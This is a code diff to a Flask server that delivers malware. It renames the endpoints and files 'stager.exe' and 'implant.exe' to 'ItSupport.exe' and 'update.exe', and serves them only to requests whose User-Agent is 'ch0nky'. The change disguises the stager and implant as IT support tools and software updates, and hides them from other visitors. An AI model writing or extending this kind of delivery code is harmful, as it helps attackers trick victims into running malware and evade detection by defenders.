@@ -69,13 +69,13 @@ def index():
     else:
         return Response(status=404, mimetype='application/json')
 
-@app.route('/stager.exe')
+@app.route('/ItSupport.exe')
 def stager():
     uploads = os.path.join(app.root_path, app.config['EXECUTABLES'])
     print(os.path.abspath(uploads))
     if(request.headers.get('User-Agent') == 'ch0nky'):
         try:
-            return send_from_directory(os.path.abspath(uploads), "stager.exe")
+            return send_from_directory(os.path.abspath(uploads), "ItSupport.exe")
         except FileNotFoundError:
             abort(404)
     else:
@@ -84,13 +84,13 @@ def stager():
         except FileNotFoundError:
             abort(404)
 
-@app.route('/implant.exe')
+@app.route('/update.exe')
 def implant():
     uploads = os.path.join(app.root_path, app.config['EXECUTABLES'])
     print(os.path.abspath(uploads))
     if(request.headers.get('User-Agent') == 'ch0nky'):
         try:
-            return send_from_directory(os.path.abspath(uploads), "implant.exe")
+            return send_from_directory(os.path.abspath(uploads), "update.exe")
         except FileNotFoundError:
             abort(404)
     else:
